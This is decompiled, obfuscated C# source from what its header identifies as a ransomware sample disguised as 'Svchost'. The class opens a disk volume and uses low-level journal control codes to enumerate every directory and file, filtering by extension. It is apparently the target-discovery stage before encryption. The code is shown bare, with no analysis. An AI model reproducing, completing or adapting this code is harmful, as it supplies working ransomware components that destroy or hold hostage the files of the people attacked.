// Decompiled with JetBrains decompiler
// Type: eZkFrthrrFwCL.qkWKRdCGhTIAL
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9AAAE71-E61A-4958-B1A7-6590C53648E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-8c723af5c826adea162ef3f2e37a1cca7b43d549c9a5fab7c9ff17f65eb5d8e7.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace eZkFrthrrFwCL
{
  public sealed class qkWKRdCGhTIAL
  {
    [NonSerialized]
    internal static GetString \u0095;

    public void yQfRnhCHpWXyR(
      string LJivkzqEkIuGV,
      HashSet<string> sCplaDTHEZjUlR,
      out Dictionary<ulong, vnuJlJKmoK> LTpTXNUOKaxS,
      out Dictionary<ulong, vnuJlJKmoK> qWJbSzjdeULqpZ)
    {
      qWJbSzjdeULqpZ = new Dictionary<ulong, vnuJlJKmoK>();
      LTpTXNUOKaxS = new Dictionary<ulong, vnuJlJKmoK>();
      IntPtr zero = IntPtr.Zero;
      IntPtr yOqsBwgzhHPwtki = IntPtr.Zero;
      try
      {
        this.YReldCYNvIyY(LJivkzqEkIuGV, qWJbSzjdeULqpZ);
        this.GWXjOKkicWpS(LJivkzqEkIuGV, out yOqsBwgzhHPwtki);
        this.JIZSCHStcFjgi(yOqsBwgzhHPwtki);
        this.bnscRjpwNwflcWhF(ref zero, yOqsBwgzhHPwtki);
        this.lcFISFJCLm(zero, ref LTpTXNUOKaxS, sCplaDTHEZjUlR, qWJbSzjdeULqpZ, yOqsBwgzhHPwtki);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message, (object) ex);
        for (Exception innerException = ex.InnerException; innerException != null; innerException = innerException.InnerException)
          Console.WriteLine(innerException.Message, (object) innerException);
        throw new ApplicationException(qkWKRdCGhTIAL.\u0095(107455250), ex);
      }
      finally
      {
        if (yOqsBwgzhHPwtki.ToInt32() != -1)
          IhRxDiuDyxSRte.yirSWTVEhqpkanh(yOqsBwgzhHPwtki);
        if (zero != IntPtr.Zero)
          Marshal.FreeHGlobal(zero);
      }
    }

    private void YReldCYNvIyY([In] string obj0, [In] Dictionary<ulong, vnuJlJKmoK> obj1)
    {
      string str = qkWKRdCGhTIAL.\u0095(107455213) + obj0 + (object) Path.DirectorySeparatorChar;
      IntPtr num = IhRxDiuDyxSRte.mskbuDsBgBi(str, 0U, 3U, IntPtr.Zero, 3U, 33554432U, IntPtr.Zero);
      if (num.ToInt32() == -1)
        return;
      IhRxDiuDyxSRte.azhXJjrFTTha XtuKaTccPJbFz = new IhRxDiuDyxSRte.azhXJjrFTTha();
      if (IhRxDiuDyxSRte.RuQAnktJFo(num, out XtuKaTccPJbFz))
      {
        ulong key = (ulong) XtuKaTccPJbFz.gMLktzYylXupVtz << 32 | (ulong) XtuKaTccPJbFz.aELFWLpPvUUJVIa;
        vnuJlJKmoK vnuJlJkmoK = new vnuJlJKmoK(str, 0UL);
        obj1.Add(key, vnuJlJkmoK);
      }
      IhRxDiuDyxSRte.yirSWTVEhqpkanh(num);
    }

    private void GWXjOKkicWpS(string aDlDrbIekjb, out IntPtr yOqsBwgzhHPwtki)
    {
      string str = qkWKRdCGhTIAL.\u0095(107455213) + aDlDrbIekjb;
      yOqsBwgzhHPwtki = IhRxDiuDyxSRte.mskbuDsBgBi(str, 3221225472U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
    }

    private void lcFISFJCLm(
      [In] IntPtr obj0,
      [In] ref Dictionary<ulong, vnuJlJKmoK> obj1,
      [In] HashSet<string> obj2,
      [In] Dictionary<ulong, vnuJlJKmoK> obj3,
      [In] IntPtr obj4)
    {
      IntPtr num1 = Marshal.AllocHGlobal(65544);
      IhRxDiuDyxSRte.YndppBDbXkdL(num1, 65544);
      uint uaYPltplhdxWs = 0;
      while (IhRxDiuDyxSRte.QxXuBUtLTc(obj4, 590003U, obj0, sizeof (IhRxDiuDyxSRte.MraCNbopUXp), num1, 65544, out uaYPltplhdxWs, IntPtr.Zero))
      {
        IntPtr num2 = new IntPtr(num1.ToInt32() + 8);
        IhRxDiuDyxSRte.AwzyqYXxoWt awzyqYxxoWt;
        for (; uaYPltplhdxWs > 60U; uaYPltplhdxWs -= awzyqYxxoWt.ijVsedXHkZ)
        {
          awzyqYxxoWt = new IhRxDiuDyxSRte.AwzyqYXxoWt(num2);
          if (((int) awzyqYxxoWt.ViATzxiPlJra & 16) != 0)
          {
            if (obj3.ContainsKey(awzyqYxxoWt.QlRwoqyaKgMok))
              throw new Exception(string.Format(qkWKRdCGhTIAL.\u0095(107455236), (object) awzyqYxxoWt.QlRwoqyaKgMok, (object) awzyqYxxoWt.FdEbcSDmJZeVZu));
            obj3.Add(awzyqYxxoWt.QlRwoqyaKgMok, new vnuJlJKmoK(awzyqYxxoWt.FdEbcSDmJZeVZu, awzyqYxxoWt.qRoovJRgXAUf));
          }
          else
          {
            bool flag = true;
            if (obj2 != null)
            {
              string extension = Path.GetExtension(awzyqYxxoWt.FdEbcSDmJZeVZu);
              flag = obj2.Contains(extension);
            }
            if (flag)
            {
              if (!obj1.ContainsKey(awzyqYxxoWt.QlRwoqyaKgMok))
              {
                obj1.Add(awzyqYxxoWt.QlRwoqyaKgMok, new vnuJlJKmoK(awzyqYxxoWt.FdEbcSDmJZeVZu, awzyqYxxoWt.qRoovJRgXAUf));
              }
              else
              {
                vnuJlJKmoK vnuJlJkmoK = obj1[awzyqYxxoWt.QlRwoqyaKgMok];
                if (string.Compare(awzyqYxxoWt.FdEbcSDmJZeVZu, vnuJlJkmoK.get_Name(), true) != 0)
                {
                  Console.WriteLine(qkWKRdCGhTIAL.\u0095(107455199), (object) awzyqYxxoWt.QlRwoqyaKgMok, (object) awzyqYxxoWt.FdEbcSDmJZeVZu, (object) vnuJlJkmoK.get_Name());
                  throw new Exception(string.Format(qkWKRdCGhTIAL.\u0095(107455236), (object) awzyqYxxoWt.QlRwoqyaKgMok, (object) awzyqYxxoWt.FdEbcSDmJZeVZu));
                }
              }
            }
          }
          num2 = new IntPtr((long) num2.ToInt32() + (long) awzyqYxxoWt.ijVsedXHkZ);
        }
        Marshal.WriteInt64(obj0, Marshal.ReadInt64(num1, 0));
      }
      Marshal.FreeHGlobal(num1);
    }

    private void JIZSCHStcFjgi([In] IntPtr obj0)
    {
      ulong num1 = 8388608;
      ulong num2 = 1048576;
      IhRxDiuDyxSRte.lzTPTysqIiu structure;
      structure.kuFDpsORroo = num1;
      structure.nyCITIeGUJIeKK = num2;
      int num3 = Marshal.SizeOf<IhRxDiuDyxSRte.lzTPTysqIiu>(structure);
      IntPtr num4 = Marshal.AllocHGlobal(num3);
      IhRxDiuDyxSRte.YndppBDbXkdL(num4, num3);
      Marshal.StructureToPtr<IhRxDiuDyxSRte.lzTPTysqIiu>(structure, num4, true);
      IhRxDiuDyxSRte.QxXuBUtLTc(obj0, 590055U, num4, num3, IntPtr.Zero, 0, out uint _, IntPtr.Zero);
    }

    private void bnscRjpwNwflcWhF([In] ref IntPtr obj0, [In] IntPtr obj1)
    {
      uint jtffXMNusUFOix = 0;
      IhRxDiuDyxSRte.tXfLZQUTQZsqq EmObRnDfDnj = new IhRxDiuDyxSRte.tXfLZQUTQZsqq();
      if (!IhRxDiuDyxSRte.rnLSKYEPUlq(obj1, 590068U, IntPtr.Zero, 0, out EmObRnDfDnj, sizeof (IhRxDiuDyxSRte.tXfLZQUTQZsqq), out jtffXMNusUFOix, IntPtr.Zero))
        return;
      IhRxDiuDyxSRte.MraCNbopUXp structure;
      structure.wYiqJmGIruxoF = 0UL;
      structure.tiziFbpnTLqJiCQg = 0L;
      structure.JvRytqTEAqdPl = EmObRnDfDnj.sLsELvxHgsksA;
      int cb = Marshal.SizeOf<IhRxDiuDyxSRte.MraCNbopUXp>(structure);
      obj0 = Marshal.AllocHGlobal(cb);
      IhRxDiuDyxSRte.YndppBDbXkdL(obj0, cb);
      Marshal.StructureToPtr<IhRxDiuDyxSRte.MraCNbopUXp>(structure, obj0, true);
    }

    static qkWKRdCGhTIAL() => Strings.CreateGetStringDelegate(typeof (qkWKRdCGhTIAL));
  }
}
